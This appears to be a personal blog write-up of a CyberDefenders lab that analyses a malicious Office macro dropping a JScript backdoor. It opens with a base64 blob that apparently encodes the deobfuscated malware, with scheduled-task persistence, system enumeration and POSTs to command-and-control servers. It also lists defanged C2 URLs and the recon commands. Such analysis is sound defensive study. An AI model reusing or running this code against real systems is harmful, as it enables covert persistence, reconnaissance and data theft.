3ZhciBwdEYwID0gRlh4OSgiMmY1MzJkNmJhZWMzZDBlYzdiMWY5OGFlZDQ3NzQ4NDMiLGN6X2IoYzB4aSkpO05vUlMocHRGMCxZSW1lKTsgICAgICAgICAgICAgICAgICBtM21ILkNsb3NlKCk7fXZhciBydUd4ID0gVGZPaCgpO2M1YWUoWUltZSxCX1RHKTtXU2NyaXB0LlNsZWVwKDMwMDAwKTtRVWp5LkRFTEVURUZJTEUoWUltZSk7fWZ1bmN0aW9uIHRiTXUoKQp7UVVqeS5ERUxFVEVGSUxFKFdTY3JpcHQuU0NSSVBURlVMTE5BTUUpO2VWX0MoIlRhc2tNYW5hZ2VyIiwiV2luZG93cyBUYXNrIE1hbmFnZXIiLHc1bVksdl9GaWxlTmFtZSwiRXpaRVRjU1h5S0FkRl9lNUkyaTEiLHd5S04sZmFsc2UpO0toRG4oIlRhc2tNYW5hZ2VyIik7V1NjcmlwdC5RdWl0KCk7fWZ1bmN0aW9uIFhFV0codVhISyxobTJqKQp7dHJ5Cnt2YXIgS3B4byA9IG5ldyBBY3RpdmVYT2JqZWN0KCJNU1hNTDIuWE1MSFRUUCIpO0tweG8uT1BFTigicG9zdCIsdVhISyxmYWxzZSk7S3B4by5TRVRSRVFVRVNUSEVBREVSKCJ1c2VyLWFnZW50OiIsIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NCk7ICIgKyBTejhrKCkpO0tweG8uU0VUUkVRVUVTVEhFQURFUigiY29udGVudC10eXBlOiIsImFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbSIpO3ZhciByUmkzID0gaExpdChobTJqLHRydWUpO0tweG8uU0VUUkVRVUVTVEhFQURFUigiY29udGVudC1sZW5ndGg6IixyUmkzLmxlbmd0aCk7S3B4by5TRU5EKHJSaTMpO3JldHVybiBLcHhvLnJlc3BvbnNlVGV4dDt9Y2F0Y2goZSkKe3JldHVybiAiIjt9fWZ1bmN0aW9uIFN6OGsoKQp7dmFyIG45bVYgPSIiO3ZhciBkYzlWID0gV1NjcmlwdC5DcmVhdGVPYmplY3QoIldTY3JpcHQuTmV0d29yayIpO3ZhciByUmkzID0gdHBPOCArIGRjOVYuQ29tcHV0ZXJOYW1lICsgdzVtWTtmb3IgKHZhciBpID0gMDsgaSA8IDE2OyBpKyspCnt2YXIgWXNYQSA9IDAKZm9yICh2YXIgaiA9IGk7IGogPCByUmkzLmxlbmd0aCAtIDE7IGorKykKe1lzWEEgPSBZc1hBIF4gclJpMy5jaGFyQ29kZUF0KGopO31Zc1hBID0oWXNYQSAlIDEwKTtuOW1WID0gbjltViArIFlzWEEudG9TdHJpbmcoMTApO31uOW1WID0gbjltViArIHRwTzg7cmV0dXJuIG45bVY7fWZ1bmN0aW9uIHJHY1IoKQp7dl9GaWxlTmFtZSA9ICB3eUtOICsgTEl4Ri5zdWJzdHJpbmcoMCxMSXhGLmxlbmd0aCAtIDIpICsgImpzIjtRVWp5LkNPUFlGSUxFKFdTY3JpcHQuU2NyaXB0RnVsbE5hbWUsd3lLTiArIExJeEYpO3ZhciBIRnA3ID0gKE1hdGgucmFuZG9tKCkqMTUwICsgMzUwKSAqIDEwMDA7V1NjcmlwdC5TbGVlcChIRnA3KTtlVl9DKCJUYXNrTWFuYWdlciIsIldpbmRvd3MgVGFzayBNYW5hZ2VyIix3NW1ZLHZfRmlsZU5hbWUsIkV6WkVUY1NYeUtBZEZfZTVJMmkxIix3eUtOLHRydWUpO31mdW5jdGlvbiBGdjZiKCkKe3ZhciBtX1JyID0gIHd5S04gKyAifmRhdC50bXAiO2ZvciAodmFyIGkgPSAwOyBpIDwgYXVNRS5sZW5ndGg7IGkrKykKe1dFODYuUnVuKCJjbWQuZXhlIC9jICIgKyBhdU1FW2ldICsgIlx4MjIiICsgbV9SciArICJceDIyIiwwLHRydWUpOwp9dmFyIG5SVk4gPSBVc3BEKG1fUnIpO1dTY3JpcHQuU2xlZXAoMTAwMCk7UVVqeS5ERUxFVEVGSUxFKG1fUnIpO3JldHVybiBGWHg5KCIyZjUzMmQ2YmFlYzNkMGVjN2IxZjk4YWVkNDc3NDg0MyIsblJWTik7fWZ1bmN0aW9uIGM1YWUoWUltZSxCX1RHKQp7dHJ5CntpZiAoUVVqeS5GSUxFRVhJU1RTKFlJbWUpKQp7V0U4Ni5SdW4oIlx4MjIiICsgWUltZSArICJceDIyIiApO319Y2F0Y2goZSkKe3ZhciBLcHhvID0gbmV3IEFjdGl2ZVhPYmplY3QoIk1TWE1MMi5YTUxIVFRQIik7S3B4by5PUEVOKCJwb3N0IixCX1RHLGZhbHNlKTt2YXIgZVBNeSA9ICJlcnJvciI7CktweG8uU0VUUkVRVUVTVEhFQURFUigidXNlci1hZ2VudDoiLCJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQpOyAiICsgU3o4aygpKTtLcHhvLlNFVFJFUVVFU1RIRUFERVIoImNvbnRlbnQtdHlwZToiLCJhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0iKTtLcHhvLlNFVFJFUVVFU1RIRUFERVIoImNvbnRlbnQtbGVuZ3RoOiIsZVBNeS5sZW5ndGgpO0tweG8uU0VORChlUE15KTtyZXR1cm4gIiI7fX1mdW5jdGlvbiBSUGJZKHJfWDUpCnt2YXIgdzhyRz0iMDEyMzQ1Njc4OUFCQ0RFRiI7dmFyIHlqcncgPSB3OHJHLnN1YnN0cihyX1g1ICYgMTUsMSk7d2hpbGUocl9YNT4xNSkKe3JfWDUgPj4%2BPSA0O3lqcncgPSB3OHJHLnN1YnN0cihyX1g1ICYgMTUsMSkgKyB5anJ3O31yZXR1cm4geWpydzt9ZnVuY3Rpb24gTnB0TyhqbEVpKQp7cmV0dXJuIHBhcnNlSW50KGpsRWksMTYpO31mdW5jdGlvbiBlVl9DKEJqbXIsUlQ2eCxPN0VjLFlCd1AsVDlQeCxlZ05yLHJtR0gpCnt0cnkKe3ZhciBCR2ZJID0gV1NjcmlwdC5DcmVhdGVPYmplY3QoIlNjaGVkdWxlLlNlcnZpY2UiKTtCR2ZJLkNvbm5lY3QoKTt2YXIgdzJjUSA9IEJHZkkuR2V0Rm9sZGVyKCJXUEQiKTt2YXIgeFNtMyA9IEJHZkkuTmV3VGFzaygwKTt4U20zLlByaW5jaXBhbC5Vc2VySWQgPSBPN0VjO3hTbTMuUHJpbmNpcGFsLkxvZ29uVHlwZSA9IDY7dmFyIHdLMkYgPSB4U20zLlJlZ2lzdHJhdGlvbkluZm87d0syRi5EZXNjcmlwdGlvbiA9IFJUNng7d0syRi5BdXRob3IgPSBPN0VjO3ZhciBhWWJ4ID0geFNtMy5TZXR0aW5nczthWWJ4LkVuYWJsZWQgPSB0cnVlO2FZYnguU3RhcnRXaGVuQXZhaWxhYmxlID0gdHJ1ZTthWWJ4LkhpZGRlbiA9IHJtR0g7dmFyIG9TUDcgPSAiMjAxNS0wNy0xMlQxMTo0NzoyNCI7dmFyIHN2YUcgPSAiMjAyMC0wMy0yMVQwODowMDowMCI7dmFyIExEb04gPSB4U20zLlRyaWdnZXJzO3ZhciByOUVDID0gTERvTi5DcmVhdGUoOSk7cjlFQy5TdGFydEJvdW5kYXJ5ID0gb1NQNztyOUVDLkVuZEJvdW5kYXJ5ID0gc3ZhRztyOUVDLklkID0gIkxvZ29uVHJpZ2dlcklkIjtyOUVDLlVzZXJJZCA9IE83RWM7cjlFQy5FbmFibGVkID0gdHJ1ZTt2YXIgZ1F1OSA9IHhTbTMuQWN0aW9ucy5DcmVhdGUoMCk7Z1F1OS5QYXRoID0gWUJ3UDtnUXU5LkFyZ3VtZW50cyA9IFQ5UHg7Z1F1OS5Xb3JraW5nRGlyZWN0b3J5ID0gZWdOcjt3MmNRLlJlZ2lzdGVyVGFza0RlZmluaXRpb24oQmptcix4U20zLDYsIiIsIiIsMyk7cmV0dXJuIHRydWU7fWNhdGNoKEVycikKe3JldHVybiBmYWxzZTt9fWZ1bmN0aW9uIEtoRG4oQmptcikKe3RyeQp7dmFyIFVHZ3cgPSBmYWxzZTt2YXIgQkdmSSA9IFdTY3JpcHQuQ3JlYXRlT2JqZWN0KCJTY2hlZHVsZS5TZXJ2aWNlIik7QkdmSS5Db25uZWN0KCkKCgp2YXIgdzJjUSA9IEJHZkkuR2V0Rm9sZGVyKCJXUEQiKTt2YXIgRkxzNiA9IHcyY1EuR2V0VGFza3MoMCk7aWYgKEZMczYuY291bnQgPj0gMCkKe3ZhciBnazFIID0gbmV3IEVudW1lcmF0b3IoRkxzNik7Zm9yICg7ICFnazFILmF0RW5kKCk7IGdrMUgubW92ZU5leHQoKSkKe2lmIChnazFILml0ZW0oKS5uYW1lID09IEJqbXIpCnt3MmNRLkRlbGV0ZVRhc2soQmptciwwKTtVR2d3ID0gdHJ1ZTt9fX19Y2F0Y2goRXJyKQp7cmV0dXJuIGZhbHNlO319ZnVuY3Rpb24gY3pfYihTM1dzKQp7dmFyIG45bVYgPSBbXTt2YXIgbXZBdSA9IFMzV3MubGVuZ3RoO2ZvciAodmFyIGkgPSAwOyBpIDwgbXZBdTsgaSsrKQp7dmFyIHd0VlggPSBTM1dzLmNoYXJDb2RlQXQoaSk7aWYod3RWWCA%2BPSAxMjgpCnt2YXIgaCA9IGI5MkFbJycgKyBSUGJZKHd0VlgpXTt3dFZYID0gTnB0TyhoKTt9bjltVi5wdXNoKHd0VlgpO31yZXR1cm4gbjltVjt9ZnVuY3Rpb24gTm9SUyhFeFkyLGlnZUspCnt2YXIgbTNtSCA9IFdTY3JpcHQuQ3JlYXRlT2JqZWN0KCJBRE9EQi5TdHJlYW0iKTttM21ILnR5cGUgPSAyO20zbUguQ2hhcnNldCA9ICJpc28tODg1OS0xIjttM21ILk9wZW4oKTttM21ILldyaXRlVGV4dChFeFkyKTttM21ILkZsdXNoKCk7bTNtSC5Qb3NpdGlvbiA9IDA7bTNtSC5TYXZlVG9GaWxlKGlnZUssMik7bTNtSC5jbG9zZSgpO31mdW5jdGlvbiBCbGd4KGdhV28pCnt3eUtOID0gImM6XHg1Y1VzZXJzXHg1YyIgKyB3NW1ZICsgIlx4NWNBcHBEYXRhXHg1Y0xvY2FsXHg1Y01pY3Jvc29mdFx4NWNXaW5kb3dzXHg1YyI7aWYgKCEgUVVqeS5GT0xERVJFWElTVFMod3lLTikpCnd5S04gPSAiYzpceDVjVXNlcnNceDVjIiArIHc1bVkgKyAiXHg1Y0FwcERhdGFceDVjTG9jYWxceDVjVGVtcFx4NWMiO2lmICghIFFVankuRk9MREVSRVhJU1RTKHd5S04pKQp3eUtOID0gImM6XHg1Y0RvY3VtZW50cyBhbmQgU2V0dGluZ3NceDVjIiArIHc1bVkgKyAiXHg1Y0FwcGxpY2F0aW9uIERhdGFceDVjTWljcm9zb2Z0XHg1Y1dpbmRvd3NceDVjIjtyZXR1cm4gd3lLTgp9ZnVuY3Rpb24gRlh4OShaXzNGLFZNZDcpCnt2YXIgTk5TWCA9IFtdO3ZhciBKRHJvID0gMDt2YXIgS2FnWTt2YXIgbjltViA9ICcnO2ZvciAodmFyIGkgPSAwOyBpIDwgMjU2OyBpKyspCntOTlNYW2ldID0gaTt9Zm9yICh2YXIgaSA9IDA7IGkgPCAyNTY7IGkrKykKe0pEcm8gPSAoSkRybyArIE5OU1hbaV0gKyBaXzNGLmNoYXJDb2RlQXQoaSAlIFpfM0YubGVuZ3RoKSkgJSAyNTY7S2FnWSA9IE5OU1hbaV07Tk5TWFtpXSA9IE5OU1hbSkRyb107Tk5TWFtKRHJvXSA9IEthZ1k7fXZhciBpID0gMDt2YXIgSkRybyA9IDA7Zm9yICh2YXIgeSA9IDA7IHkgPCBWTWQ3Lmxlbmd0aDsgeSsrKQp7aSA9IChpICsgMSkgJSAyNTY7SkRybyA9IChKRHJvICsgTk5TWFtpXSkgJSAyNTY7S2FnWSA9IE5OU1hbaV07Tk5TWFtpXSA9IE5OU1hbSkRyb107Tk5TWFtKRHJvXSA9IEthZ1k7bjltViArPSBTdHJpbmcuZnJvbUNoYXJDb2RlKFZNZDdbeV0gXiBOTlNYWyhOTlNYW2ldICsgTk5TWFtKRHJvXSkgJSAyNTZdKTt9cmV0dXJuIG45bVY7fQ) so I hope it works


Right away we can see a ton of suspicious stuff. Like this block of URLs, defanged

```
var CKpR = new Array('hxxp://www.saipadiesel124[.]com/wp-content/plugins/imsanity/tmp[.]php', 'hxxp://www.folk-cantabria[.]com/wp-content/plugins/wp-statistics/includes/classes/gallery_create_page_field[.]php');

```

You also see this block of commands to enumerate system information

```
var auME = new Array('systeminfo > ', 'net view >> ', 'net view /domain >> ', 'tasklist /v >> ', 'gpresult /z >> ', 'netstat -nao >> ', 'ipconfig /all >> ', 'arp -a >> ', 'net share >> ', 'net use >> ', 'net user >> ', 'net user administrator >> ', 'net user /domain >> ', 'net user administrator /domain >> ', 'set  >> ', 'dir %systemdrive%\\Users\\*.* >> ', 'dir %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.* >> ', 'dir %userprofile%\\Desktop\\*.* >> ', 'tasklist /fi "modules eq wow64.dll"  >> ', 'tasklist /fi "modules ne wow64.dll" >> ', 'dir "%programfiles(x86)%" >> ', 'dir "%programfiles%" >> ', 'dir %appdata% >>');
```

It creates some script ojbects runs them, there's some C2 stuff, a username generator, and attempts to create persistent tasks.

I don't think I'm gonna get a great idea of what exactly it does without executing it, so I'm gonna start seeing what questions I can answer.


# Questions

## What is the sha256 hash of the doc file?
 
Pretty easy, we got this earlier by running sha256sum on the file. 

`ff2c8cadaa0fd8da6138cce6fce37e001f53a5d9ceccd67945b15ae273f4d751`

## Multiple streams contain macros in this document. Provide the number of lowest one.

See above again, stream 8 is the answer

## What is the decryption key of the obfuscated code?

This is the string we inserted as a static variable in the JS script, `EzZETcSXyKAdF_e5I2i1`

## What is the name of the dropped file?

This is our buddy `maintools.js`

## This script uses what language?

Good ol javascript, but the answer they want is `JScript`

## What is the name of the variable that is assigned the command-line arguments?

The command line argument was the decryption key, that was assigned to `wvy1`

## How many command-line arguments does this script expect?

It expects 1

## What instruction is executed if this script encounters an error?

We had to remove this since nodejs doesn't know what it is `WScript.Quit()`

## What function returns the next stage of code (i.e. the first round of obfuscated code)?

This is `y3zb`, look at that first line of the script, y3zb is the first one called

```js
try{var wvy1 = WScript.Arguments;var ssWZ = wvy1(0);var ES3c = y3zb();ES3c = LXv5(ES3c);ES3c = CpPT(ssWZ,ES3c);eval(ES3c);  
```

## The function LXv5 is an important function, what variable is assigned a key string value in determining what this function does?

This function is assigned the alphabet so it can construct strings

```
}function LXv5(d27x){var LUK7 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";var i;var j;var n6T8;if (d27x.length % 4 > 0)
```

## What encoding scheme is this function responsible for decoding?

The big block of text is base64 encoded, you seen it enough you just know, but the `=` at the end is another giveaway

## In the function CpPT, the first two for loops are responsible for what important part of this function?

I didn't get this one, even with the hints. I tried AES, because I saw the IV value set, but wasn't sure, encryption isn't my strong suit. I also tried RC4, CBC, XOR, and no dice. Either I am way off or its not being input in the format the want???

## The function CpPT requires two arguments, where does the value of the first argument come from?

This variable came from the `command-line argument`

## For the function CpPT, what does the first argument represent?

They first arg is the `key`

## What encryption algorithm does the function CpPT implement in this script?

Gonna guess RC4 here

## What function is responsible for executing the deobfuscated code?

`eval` was the big one we defanged, that's the one

## What Windows Script Host program can be used to execute this script in command-line mode?

That'll be `CScript.exe`

## What is the name of the first function defined in the deobfuscated code?

We can look at the deobfuscated code and see `function UspD(zDmy)` was defined first


## All Done

Ok that's all done. What a good one, I was able to pull some IOCs and answer almost all the questions. Once I was done, I took a look at the write up in the video and saw the wrong answer I had, I was way off lol. This took me a few different nights over several weeks, maybe an hour or two here and there for a total of about 4 hours of effort. 

It was vindicating to see that the processes I use (which are admittedly somewhat janky) still work. In a real situation, I would have probably leaned heavier on a sandbox I hope whoever I work for at the time would be paying for or go through manual steps like this. Another option, especially if I don't care about the details and just wanna pull IOCs out, is to run it in a malware detonation VM with something like Sysmon or an EDR running to see what it catches. 

Typically with something like this, I want Hashes, URLs, file names, process names, command line arguments, and other similar IOCs so I can scope the breadth of the infection in an environment. At home, on cyberdefenders.org, I just wanna see how many points I get. 

Thanks for reading, hope you got something out of this. 
